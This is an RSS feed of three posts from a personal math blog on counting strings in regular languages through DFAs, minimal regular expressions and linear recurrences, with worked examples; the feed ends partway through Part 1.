<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>x0r19x91&#39;s blog</title>
        <link>http://localhost:1313/</link>
        <description>Recent content on x0r19x91&#39;s blog</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-us</language>
        <lastBuildDate>Fri, 27 Nov 2020 00:00:00 +0000</lastBuildDate><atom:link href="http://localhost:1313/index.xml" rel="self" type="application/rss+xml" /><item>
        <title>Counting Strings - Part 2</title>
        <link>http://localhost:1313/post/counting-strings-2/</link>
        <pubDate>Fri, 27 Nov 2020 00:00:00 +0000</pubDate>
        
        <guid>http://localhost:1313/post/counting-strings-2/</guid>
        <description>&lt;p&gt;I strongly recommend you to read &lt;a class=&#34;link&#34; href=&#34;http://localhost:1313/post/counting-strings-1&#34; &gt;&lt;ins&gt;Part-1&lt;/ins&gt;&lt;/a&gt; before proceeding into this section.&lt;/p&gt;
&lt;p&gt;Now, let&amp;rsquo;s define the same for regular expressions. And then the fun begins&lt;/p&gt;
&lt;p&gt;&lt;span id=&#34;minr&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Given a Regular language \(R\), &lt;ins&gt;&lt;strong&gt;Minimal Regular Expression&lt;/strong&gt;&lt;/ins&gt; is the regular expression generated from the minimal DFA that accepts \(R\)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;For example:&lt;br&gt;
Let \(R_0 = (a+b+ab)^\ast, R_1 = (a+b)^\ast \).&lt;br&gt;
\(R_0\) is &lt;ins&gt;&lt;strong&gt;not Minimal&lt;/strong&gt;&lt;/ins&gt; since we have two distinct ways of accepting the string \(ab\). But \(R_1\) is &lt;ins&gt;&lt;strong&gt;Minimal&lt;/strong&gt;&lt;/ins&gt;&lt;/p&gt;
&lt;p&gt;Let \({\lbrack R \rbrack}_n \) denote the number of n length strings accepted by the minimal regular expression \(R\)&lt;/p&gt;
&lt;p&gt;The following definations are valid for all &lt;a class=&#34;link&#34; href=&#34;#minr&#34; &gt;&lt;ins&gt;Minimal Regular Expression&lt;/ins&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;span id=&#34;def1&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;defn-1&#34;&gt;Defn. 1&lt;/h3&gt;
&lt;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;\(R = \alpha \)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;p&gt;then,
$$ {\lbrack R \rbrack}_n = \begin{cases} 1 &amp;amp;\text{if n = \(\vert \alpha \vert\) } \\ 0 &amp;amp;\text{otherwise} \end{cases} \tag{1} $$&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;Proof&lt;/em&gt;.: This is the base case. \(R\) accepts \(\alpha\). So, there is only one string of length \(n \) generated, i.e., \(\alpha\)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span id=&#34;def2&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;defn-2&#34;&gt;Defn. 2&lt;/h3&gt;
&lt;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;\(R = R_1 + R_2 \)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;p&gt;then,&lt;/p&gt;
&lt;p&gt;$$ {\lbrack R \rbrack}_n = {\lbrack R_1 \rbrack}_n + {\lbrack R_2 \rbrack}_n \tag{2} $$&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;Proof&lt;/em&gt;.: By defination \(R_1\) and \(R_2\) there will be no common prefix except \(\epsilon\), so \(R_1\) and \(R_2\) generate different strings&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span id=&#34;def3&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;defn-3&#34;&gt;Defn. 3&lt;/h3&gt;
&lt;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;\(R = R_1 \cdot R_2 \)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;p&gt;then,&lt;/p&gt;
&lt;p&gt;$$ {\lbrack R \rbrack}_n = \sum_{\substack{0 \leq k \leq n}}{{\lbrack R_1 \rbrack}_k \cdot {\lbrack R_2 \rbrack}_{n-k}} \tag{3} $$&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;Proof&lt;/em&gt;.: Let \(s\) be one of the strings accepted by \(R\). Since \(R = R_1 \cdot R_2 \), we can generate \(s\lbrack :k \rbrack\) from \(R_1\) and \(s\lbrack k: \rbrack\) from \(R_2\), where \( 0 \leq k \leq n \).&lt;br&gt;
Let \(k&#39;\) be a value of \(k\) such that \(s\lbrack :k \rbrack\) is not accepted by \(R_1\) then \({\lbrack R_1 \rbrack}_k\) will be 0 \(\implies {\lbrack R_1 \rbrack}_{k&#39;} \cdot {\lbrack R_2 \rbrack}_{n-{k&#39;}} = 0\). In other words, \(k&#39;\) does not contribute to \({\lbrack R \rbrack}_n\)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span id=&#34;def4&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;defn-4&#34;&gt;Defn. 4&lt;/h3&gt;
&lt;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;\(R = {R}^\ast \)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;p&gt;then,&lt;/p&gt;
&lt;p&gt;$$ {\lbrack R^\ast \rbrack}_n = \begin{cases} 1 &amp;amp;\text{if n = 0 } \\ \sum_{\substack{1 \leq k \leq n}}{{\lbrack R \rbrack}_k \cdot {\lbrack R^\ast \rbrack}_{n-k}} &amp;amp;\text{n} \geq 1 \end{cases} \tag{4} $$&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;Proof&lt;/em&gt;.:&lt;br&gt;
From the defination, \(R^\ast = \epsilon + R + R^2 + R^3 + \dots = \epsilon + R \cdot R^\ast \).&lt;br&gt;
Applying &lt;a class=&#34;link&#34; href=&#34;#def1&#34; &gt;&lt;ins&gt;(1)&lt;/ins&gt;&lt;/a&gt; for \(n = 0\), and &lt;a class=&#34;link&#34; href=&#34;#def3&#34; &gt;&lt;ins&gt;(3)&lt;/ins&gt;&lt;/a&gt; for \(n \geq 1\) we get the result.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;example-1&#34;&gt;Example 1.&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Find the recurrence for the number of strings accepted by \({\lparen a+bb+ccc \rparen}^\ast\)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Let \(R = a+bb+ccc \)&lt;br&gt;
From &lt;a class=&#34;link&#34; href=&#34;#def4&#34; &gt;&lt;ins&gt;(4)&lt;/ins&gt;&lt;/a&gt;,&lt;/p&gt;
&lt;p&gt;$$ {\lbrack R^\ast \rbrack}_n = {\lbrack R \rbrack}_1 \cdot {\lbrack R^\ast \rbrack}_{n-1} + {\lbrack R \rbrack}_2 \cdot {\lbrack R^\ast \rbrack}_{n-2} + {\lbrack R \rbrack}_3 \cdot {\lbrack R^\ast \rbrack}_{n-3} + \dots + {\lbrack R \rbrack}_{n-1} \cdot {\lbrack R^\ast \rbrack}_{1} $$&lt;/p&gt;
&lt;p&gt;For \(n \geq 4\), \({\lbrack R \rbrack}_n = 0\) since the maximum string length generated by \(R\) is \(3\).&lt;/p&gt;
&lt;p&gt;&lt;span id=&#34;eg1&#34;&gt;&lt;/span&gt;
So, $$ {\lbrack R^\ast \rbrack}_n = {\lbrack R \rbrack}_1 \cdot {\lbrack R^\ast \rbrack}_{n-1} + {\lbrack R \rbrack}_2 \cdot {\lbrack R^\ast \rbrack}_{n-2} + {\lbrack R \rbrack}_3 \cdot {\lbrack R^\ast \rbrack}_{n-3} \tag{eg.1.1} $$&lt;/p&gt;
&lt;p&gt;Using &lt;a class=&#34;link&#34; href=&#34;#def1&#34; &gt;&lt;ins&gt;(1)&lt;/ins&gt;&lt;/a&gt;, we have
$${\lbrack R \rbrack}_1 = 1, {\lbrack R \rbrack}_2 = 1, {\lbrack R \rbrack}_3 = 1 $$&lt;/p&gt;
&lt;p&gt;Substituing the values in &lt;a class=&#34;link&#34; href=&#34;#eg1&#34; &gt;&lt;ins&gt;(eg.1.1)&lt;/ins&gt;&lt;/a&gt;, we get,&lt;/p&gt;
&lt;p&gt;$$ \begin{aligned} {\lbrack R^\ast \rbrack}_n &amp;amp;= 1 \cdot {\lbrack R^\ast \rbrack}_{n-1} + 1 \cdot {\lbrack R^\ast \rbrack}_{n-2} + 1 \cdot {\lbrack R^\ast \rbrack}_{n-3} \\ &amp;amp;= {\lbrack R^\ast \rbrack}_{n-1} + {\lbrack R^\ast \rbrack}_{n-2} + {\lbrack R^\ast \rbrack}_{n-3} \end{aligned} \tag{eg.1.2} $$&lt;/p&gt;
&lt;p&gt;Base Cases:&lt;/p&gt;
&lt;p&gt;$$ {\lbrack R^\ast \rbrack}_0 = 1 $$
$$ {\lbrack R^\ast \rbrack}_1 = 1 $$
$$ {\lbrack R^\ast \rbrack}_2 = 1+1 = 2 \tag{\texttt{&amp;ldquo;aa&amp;rdquo;, &amp;ldquo;bb&amp;rdquo;}} $$&lt;/p&gt;
&lt;p&gt;So, the solution is&lt;/p&gt;
&lt;p&gt;$${\lbrack R^\ast \rbrack}_n = \begin{cases} {\lbrack R^\ast \rbrack}_{n-1} + {\lbrack R^\ast \rbrack}_{n-2} + {\lbrack R^\ast \rbrack}_{n-3} &amp;amp;\text{n} \geq 3 \\ 1 &amp;amp;\text{n = 0, 1} \\ 2 &amp;amp;\text{n = 2} \end{cases} \tag{eg.1.2}$$&lt;/p&gt;
&lt;h3 id=&#34;example-2&#34;&gt;Example 2.&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Find the recurrence for the number of strings accepted by \({\lparen a+bb+cc+ddd \rparen}^\ast\)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Let \(R = a+bb+cc+ddd \)&lt;br&gt;
From &lt;a class=&#34;link&#34; href=&#34;#def4&#34; &gt;&lt;ins&gt;(4)&lt;/ins&gt;&lt;/a&gt;,&lt;/p&gt;
&lt;p&gt;$$ {\lbrack R^\ast \rbrack}_n = {\lbrack R \rbrack}_1 \cdot {\lbrack R^\ast \rbrack}_{n-1} + {\lbrack R \rbrack}_2 \cdot {\lbrack R^\ast \rbrack}_{n-2} + {\lbrack R \rbrack}_3 \cdot {\lbrack R^\ast \rbrack}_{n-3} + \dots + {\lbrack R \rbrack}_{n-1} \cdot {\lbrack R^\ast \rbrack}_{1} $$&lt;/p&gt;
&lt;p&gt;For \(n \geq 4\), \({\lbrack R \rbrack}_n = 0\) since the maximum string length generated by \(R\) is \(3\).&lt;/p&gt;
&lt;p&gt;&lt;span id=&#34;eg2&#34;&gt;&lt;/span&gt;
So, $$ {\lbrack R^\ast \rbrack}_n = {\lbrack R \rbrack}_1 \cdot {\lbrack R^\ast \rbrack}_{n-1} + {\lbrack R \rbrack}_2 \cdot {\lbrack R^\ast \rbrack}_{n-2} + {\lbrack R \rbrack}_3 \cdot {\lbrack R^\ast \rbrack}_{n-3} \tag{eg.2.1} $$&lt;/p&gt;
&lt;p&gt;Using &lt;a class=&#34;link&#34; href=&#34;#def1&#34; &gt;&lt;ins&gt;(1)&lt;/ins&gt;&lt;/a&gt;, we have
$${\lbrack R \rbrack}_1 = 1, {\lbrack R \rbrack}_2 = 2, {\lbrack R \rbrack}_3 = 1 $$&lt;/p&gt;
&lt;p&gt;Substituting the values in &lt;a class=&#34;link&#34; href=&#34;#eg2&#34; &gt;&lt;ins&gt;(eg.2.1)&lt;/ins&gt;&lt;/a&gt;, we get,&lt;/p&gt;
&lt;p&gt;$$ \begin{aligned} {\lbrack R^\ast \rbrack}_n &amp;amp;= 1 \cdot {\lbrack R^\ast \rbrack}_{n-1} + 2 \cdot {\lbrack R^\ast \rbrack}_{n-2} + 1 \cdot {\lbrack R^\ast \rbrack}_{n-3} \\ &amp;amp;= {\lbrack R^\ast \rbrack}_{n-1} + 2 \cdot {\lbrack R^\ast \rbrack}_{n-2} + {\lbrack R^\ast \rbrack}_{n-3} \end{aligned} \tag{eg.1.2} $$&lt;/p&gt;
&lt;p&gt;Base Cases:&lt;/p&gt;
&lt;p&gt;$$ {\lbrack R^\ast \rbrack}_0 = 1 $$
$$ {\lbrack R^\ast \rbrack}_1 = 1 $$
$$ {\lbrack R^\ast \rbrack}_2 = 1+1+1 = 3 \tag{\texttt{&amp;ldquo;aa&amp;rdquo;, &amp;ldquo;bb&amp;rdquo;, &amp;ldquo;cc&amp;rdquo;}} $$&lt;/p&gt;
&lt;p&gt;So, the solution is&lt;/p&gt;
&lt;p&gt;$${\lbrack R^\ast \rbrack}_n = \begin{cases} {\lbrack R^\ast \rbrack}_{n-1} + 2 \cdot {\lbrack R^\ast \rbrack}_{n-2} + {\lbrack R^\ast \rbrack}_{n-3} &amp;amp;\text{n} \geq 3 \\ 1 &amp;amp;\text{n = 0, 1} \\ 3 &amp;amp;\text{n = 2} \end{cases} \tag{eg.1.2}$$&lt;/p&gt;
&lt;p&gt;That&amp;rsquo;s all for part-2. Stay tuned for the next part!&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Counting Strings - Part 3</title>
        <link>http://localhost:1313/post/counting-strings-part-3/</link>
        <pubDate>Fri, 27 Nov 2020 00:00:00 +0000</pubDate>
        
        <guid>http://localhost:1313/post/counting-strings-part-3/</guid>
        <description>&lt;p&gt;I strongly recommend you to read &lt;a class=&#34;link&#34; href=&#34;http://localhost:1313/post/counting-strings-1&#34; &gt;&lt;ins&gt;Part-1&lt;/ins&gt;&lt;/a&gt; and &lt;a class=&#34;link&#34; href=&#34;http://localhost:1313/post/counting-strings-2&#34; &gt;&lt;ins&gt;Part-2&lt;/ins&gt;&lt;/a&gt; before proceeding into this section.&lt;/p&gt;
&lt;p&gt;In this part, we will derive a general formula for solving linear recurrences.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Find the recurrence for the number of strings generated by the regular expression \({\lparen a+bb+ccc \rparen}^\ast\)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;From &lt;a class=&#34;link&#34; href=&#34;http://localhost:1313/post/counting-strings-2#eg1&#34; &gt;&lt;ins&gt;Part-2&lt;/ins&gt;&lt;/a&gt;, we have&lt;/p&gt;
&lt;p&gt;$${\lbrack R^\ast \rbrack}_n = \begin{cases} {\lbrack R^\ast \rbrack}_{n-1} + {\lbrack R^\ast \rbrack}_{n-2} + {\lbrack R^\ast \rbrack}_{n-3} &amp;amp;\text{n} \geq 3 \\ 1 &amp;amp;\text{n = 0, 1} \\ 2 &amp;amp;\text{n = 2} \end{cases} \tag{eg.1.2}$$&lt;/p&gt;
&lt;p&gt;So we have the recurrence  $$r_n = r_{n-1}+r_{n-2}+r_{n-3}$$ This corresponds to the strings generated by the regular expression $${\lparen a+bb+ccc \rparen}^\ast$$&lt;/p&gt;
&lt;p&gt;In other words, \(r_n \) is equal to number of strings of length n generated by \({\lparen a+bb+ccc \rparen}^\ast\). Now suppose we have to construct a string using \(\texttt{&amp;ldquo;a&amp;rdquo;}\), \(\texttt{&amp;ldquo;bb&amp;rdquo;}\), and \(\texttt{&amp;ldquo;ccc&amp;rdquo;}\) only&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s place \(\texttt{&amp;ldquo;ccc&amp;rdquo;}\) \(g_c\) times, \(\texttt{&amp;ldquo;bb&amp;rdquo;}\) \(g_b\) times and \(\texttt{&amp;ldquo;a&amp;rdquo;}\) \(g_a\) times to make the string. We have,&lt;/p&gt;
&lt;p&gt;$$ n = 3 g_c + 2 g_b + g_a $$&lt;/p&gt;
&lt;p&gt;And, now we place \(g_a\), \(g_b\), and \(g_c\) into groups in&lt;/p&gt;
&lt;p&gt;$$\sum_{\substack{0 \leq g_a, g_b, g_c \leq n}}{\binom{g_a+g_b+g_c}{g_a}\binom{g_b+g_c}{g_b}\binom{g_c}{g_c}}$$&lt;/p&gt;
&lt;p&gt;Simplifying,&lt;/p&gt;
&lt;p&gt;$$r_n = \sum_{\substack{0 \leq g_a, g_b, g_c \leq n}}{\frac{(g_a+g_b+g_c)!}{g_a!\space g_b!\space g_c!}}$$&lt;/p&gt;
&lt;p&gt;Generalization of this result is described in my article:&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/x0r19x91/papers/blob/main/Result.pdf&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Generalization of Linear Recurrences&lt;/a&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Counting Strings - Part 1</title>
        <link>http://localhost:1313/post/counting-strings-1/</link>
        <pubDate>Wed, 25 Nov 2020 00:00:00 +0000</pubDate>
        
        <guid>http://localhost:1313/post/counting-strings-1/</guid>
        <description>&lt;p&gt;One day, I was solving a recurrence problem from Kenneth Rosen&amp;rsquo;s Discrete Math book.&lt;/p&gt;
&lt;h2 id=&#34;question-1&#34;&gt;Question 1&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Find the recurrence for the number of bitstrings of length n, containing no two consecutive zeros&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;This is quite easy, right?&lt;/p&gt;
&lt;p&gt;Let \(a_n\) be the number of strings of length n.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;If the string starts with \(1\), we have \(a_{n-1}\) choices since there&amp;rsquo;s no restriction.&lt;/li&gt;
&lt;li&gt;If the string starts with \(0\), we must have \(0\) after it, so \(a_{n-2}\) choices.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;And since these cases don&amp;rsquo;t overlap, we can sum them to compute \(a_n\)&lt;br&gt;
So, $$a_n = a_{n-1}+a_{n-2}$$&lt;/p&gt;
&lt;p&gt;Sweet and simple fibonacci.
Here comes the fun part. The next problem.&lt;/p&gt;
&lt;h2 id=&#34;question-2&#34;&gt;Question 2&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Find a recurrence relation for the number of n-digit strings over \(\{0,9\}^*\), with an even number of zeros.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;I couldn&amp;rsquo;t construct a case easily. I thought of it, (didn&amp;rsquo;t look at the solution yet) and I got an idea -&lt;/p&gt;
&lt;p&gt;Let \(e_n\) denote the number of n-length strings with even number of zeros&lt;br&gt;
Let \(o_n\) denote the number of n-length strings with odd number of zeros&lt;/p&gt;
&lt;p&gt;If we are in \(e_n\)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;we are looking at \(0\), then we have consumed a \(0\) and we need to consume odd number of zeros, i.e. \(o_{n-1}\)&lt;/li&gt;
&lt;li&gt;we are looking at any other digit, then we consumed one digit, so we need \(9e_{n-1}\) for the other digits&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;If we are in \(o_n\)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;we are looking at \(0\), then we have consumed a \(0\) and we need to consume even number of zeros, i.e. \(e_{n-1}\)&lt;/li&gt;
&lt;li&gt;we are looking at any other digit, then we consumed one digit, so we need \(9o_{n-1}\) since we are still in an odd parity&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;span id=&#34;orgeq&#34;&gt;&lt;/span&gt;
So,&lt;/p&gt;
&lt;p&gt;$$
e_n = o_{n-1}+9e_{n-1} \newline
o_n = e_{n-1}+9o_{n-1}
$$&lt;/p&gt;
&lt;p&gt;Now, it&amp;rsquo;s time to solve them 
$$
a_n = e_n+o_n = o_{n-1}+e_{n-1}+9(o_{n-1}+e_{n-1}) = 10a_{n-1}
\tag{1}
$$&lt;/p&gt;
&lt;p&gt;Also,&lt;/p&gt;
&lt;p&gt;$$
d_n = e_n-o_n = 9(e_{n-1}-o_{n-1}) - (e_{n-1}-o_{n-1}) = 8d_{n-1}
\tag{2}
$$&lt;/p&gt;
&lt;p&gt;The Base case:&lt;br&gt;
\(e_1 = 9, o_1 = 1 \implies a_1 = 10,\space d_1 = 8 \implies a_n = 10^n, \space d_n = 8^n\)&lt;/p&gt;
&lt;p&gt;From \((1)\) and \((2)\) we have, 
$$e_n = \frac{10^n+8^n}{2}$$&lt;/p&gt;
&lt;h3 id=&#34;why-did-we-construct-two-recurrences-&#34;&gt;Why did we construct two recurrences ?&lt;/h3&gt;
&lt;p&gt;We constructed two recurrence relations since we need to count the number of zeros mod 2.&lt;br&gt;
Let&amp;rsquo;s look more closely. In the problem, we are counting strings with even number of zeros, in the alphabet \(\{0-9\}^*\). Infact, this is a regular language since we can construct a DFA to accept it.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
		&lt;a href=&#34;http://localhost:1313/post/counting-strings-1/a1.png&#34; data-size=&#34;2968x2789&#34;&gt;
			&lt;img srcset=&#34;http://localhost:1313/post/counting-strings-1/a1_hu3c0a6ef0706ff21f5576ec81b30eb595_59526_480x0_resize_box_2.png 480w, http://localhost:1313/post/counting-strings-1/a1_hu3c0a6ef0706ff21f5576ec81b30eb595_59526_1024x0_resize_box_2.png 1024w&#34;
				src=&#34;http://localhost:1313/post/counting-strings-1/a1.png&#34; width=&#34;2968&#34; height=&#34;2789&#34; loading=&#34;lazy&#34;
				alt=&#34;DFA&#34;&gt;
		&lt;/a&gt;
		
		&lt;figcaption&gt;DFA&lt;/figcaption&gt;
		
	&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Cool! Now let&amp;rsquo;s tweak this DFA a bit to count strings. Lets index each state with an integer \(i\) to represent the number of strings of length \(i\) accepted by that state.&lt;/p&gt;
&lt;p&gt;Let \(s_n\) represent number of strings of length \(n\) accepted by the DFA starting at state \(s\)&lt;/p&gt;
&lt;p&gt;So,&lt;/p&gt;
&lt;p&gt;$$ init_n = odd_{n-1} + 9even_{n-1} \tag{1} $$ 
because we have only one way to reach \(odd\) and \(9\) ways to reach \(even\) from \(init\). In either way we consume one symbol, so \(n \rightarrow n-1\)&lt;/p&gt;
&lt;p&gt;Similarly, $$even_n = 9even_{n-1}+odd_{n-1} \tag{2}$$
$$odd_n = 9odd_{n-1}+even_{n-1} \tag{3}$$&lt;/p&gt;
&lt;p&gt;Wait! \((2)\) and \((3)\) are the &lt;a class=&#34;link&#34; href=&#34;#orgeq&#34; &gt;recurrences&lt;/a&gt; we used to solve this problem. So, we can define recurrences now, but we also need the base cases.&lt;/p&gt;
&lt;p&gt;\(even_0 = 1, odd_0 = init_0 = 0\) since \(even\) is a final state (if we start at \(even\), we can accept only \(\epsilon\)) whereas \(odd\) and \(init\) are non-final states.&lt;/p&gt;
&lt;h2 id=&#34;generalization&#34;&gt;Generalization&lt;/h2&gt;
&lt;p&gt;To generalize this concept, we need to define some rules.&lt;/p&gt;
&lt;h3 id=&#34;case-1&#34;&gt;Case 1&lt;/h3&gt;
&lt;p&gt;&lt;span id=&#34;case1&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
		&lt;a href=&#34;http://localhost:1313/post/counting-strings-1/a2.png&#34; data-size=&#34;3768x1012&#34;&gt;
			&lt;img srcset=&#34;http://localhost:1313/post/counting-strings-1/a2_hub3967cbfd2efbcbed6fae1c618dd2b41_25433_480x0_resize_box_2.png 480w, http://localhost:1313/post/counting-strings-1/a2_hub3967cbfd2efbcbed6fae1c618dd2b41_25433_1024x0_resize_box_2.png 1024w&#34;
				src=&#34;http://localhost:1313/post/counting-strings-1/a2.png&#34; width=&#34;3768&#34; height=&#34;1012&#34; loading=&#34;lazy&#34;
				alt=&#34;Case 1&#34;&gt;
		&lt;/a&gt;
		
		&lt;figcaption&gt;Case 1&lt;/figcaption&gt;
		
	&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Then&lt;/p&gt;
&lt;p&gt;$$
A_n = B_{n-\lvert \alpha \rvert}
$$&lt;/p&gt;
&lt;h4 id=&#34;proof&#34;&gt;Proof&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;In this step, we consume \(\alpha\) to move from \(A\) to \(B\). So if we count n-length strings from state \(A\), we have to count strings of length \(n-\lvert \alpha \rvert\) from state \(B\), as we are removing the prefix \(\alpha\) in the transition.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;case-2&#34;&gt;Case 2&lt;/h3&gt;
&lt;p&gt;&lt;figure&gt;
		&lt;a href=&#34;http://localhost:1313/post/counting-strings-1/a3.png&#34; data-size=&#34;2261x1777&#34;&gt;
			&lt;img srcset=&#34;http://localhost:1313/post/counting-strings-1/a3_hu7b3b18179f39dd19b04d73b9350de6d6_30270_480x0_resize_box_2.png 480w, http://localhost:1313/post/counting-strings-1/a3_hu7b3b18179f39dd19b04d73b9350de6d6_30270_1024x0_resize_box_2.png 1024w&#34;
				src=&#34;http://localhost:1313/post/counting-strings-1/a3.png&#34; width=&#34;2261&#34; height=&#34;1777&#34; loading=&#34;lazy&#34;
				alt=&#34;Case 2&#34;&gt;
		&lt;/a&gt;
		
		&lt;figcaption&gt;Case 2&lt;/figcaption&gt;
		
	&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Then&lt;/p&gt;
&lt;p&gt;$$
A_n = B_{n-\lvert \alpha \rvert} + C_{n-\lvert \beta \rvert}
$$&lt;/p&gt;
&lt;p&gt;where \(\alpha\) and \(\beta\) have no common prefix&lt;/p&gt;
&lt;h4 id=&#34;proof-1&#34;&gt;Proof&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;Applying &lt;a class=&#34;link&#34; href=&#34;#case1&#34; &gt;Case 1&lt;/a&gt; for \(A \longrightarrow B\) and \(A \longrightarrow C \), we get the result. And since we are defining the rules for DFA, \(\alpha\) and \(\beta\) have no common prefix except \(\epsilon\), so \(B_{n-\lvert \alpha \rvert}\) and \(C_{n-\lvert \beta \rvert}\) have no strings in common&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;case-3&#34;&gt;Case 3&lt;/h3&gt;
&lt;p&gt;&lt;figure&gt;
		&lt;a href=&#34;http://localhost:1313/post/counting-strings-1/a4.png&#34; data-size=&#34;400x612&#34;&gt;
			&lt;img srcset=&#34;http://localhost:1313/post/counting-strings-1/a4_hu02d08a08cf619cb5f98af06f979705ad_6543_480x0_resize_box_2.png 480w, http://localhost:1313/post/counting-strings-1/a4_hu02d08a08cf619cb5f98af06f979705ad_6543_1024x0_resize_box_2.png 1024w&#34;
				src=&#34;http://localhost:1313/post/counting-strings-1/a4.png&#34; width=&#34;400&#34; height=&#34;612&#34; loading=&#34;lazy&#34;
				alt=&#34;Case 3&#34;&gt;
		&lt;/a&gt;
		
		&lt;figcaption&gt;Case 3&lt;/figcaption&gt;
		
	&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Then&lt;/p&gt;
&lt;p&gt;$$
A_n = A_{n-\lvert \alpha \rvert}
$$&lt;/p&gt;
&lt;p&gt;where \(\alpha\) and \(\beta\) have no common prefix&lt;/p&gt;
&lt;h4 id=&#34;proof-2&#34;&gt;Proof&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;Applying &lt;a class=&#34;link&#34; href=&#34;#case1&#34; &gt;Case 1&lt;/a&gt; for \(A \longrightarrow A\)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Now let&amp;rsquo;s solve a difficult recurrence using DFA&lt;/p&gt;
&lt;h3 id=&#34;base-cases&#34;&gt;Base Cases&lt;/h3&gt;
&lt;p&gt;$$A_0 = \begin{cases} 1 &amp;amp;\text{if A is final} \\ 0 &amp;amp;\text{if A is non final} \end{cases}$$&lt;/p&gt;
&lt;h4 id=&#34;proof-3&#34;&gt;Proof&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;If \(A\) is final, we accept \(\epsilon\) at \(A\).&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;question-3&#34;&gt;Question 3&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Find a recurrence for the number of ternary strings that do not contain consecutive symbols that are same&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;So, we cannot have &lt;code&gt;00&lt;/code&gt;, &lt;code&gt;11&lt;/code&gt;, and &lt;code&gt;22&lt;/code&gt; as substrings.&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s construct the DFA first&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
		&lt;a href=&#34;http://localhost:1313/post/counting-strings-1/a5.png&#34; data-size=&#34;2470x1829&#34;&gt;
			&lt;img srcset=&#34;http://localhost:1313/post/counting-strings-1/a5_hue5cba305745796ca2effad1c08cd03ae_46411_480x0_resize_box_2.png 480w, http://localhost:1313/post/counting-strings-1/a5_hue5cba305745796ca2effad1c08cd03ae_46411_1024x0_resize_box_2.png 1024w&#34;
				src=&#34;http://localhost:1313/post/counting-strings-1/a5.png&#34; width=&#34;2470&#34; height=&#34;1829&#34; loading=&#34;lazy&#34;
				alt=&#34;DFA for Q.3&#34;&gt;
		&lt;/a&gt;
		
		&lt;figcaption&gt;DFA for Q.3&lt;/figcaption&gt;
		
	&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Now, let&amp;rsquo;s write the recurrences&lt;/p&gt;
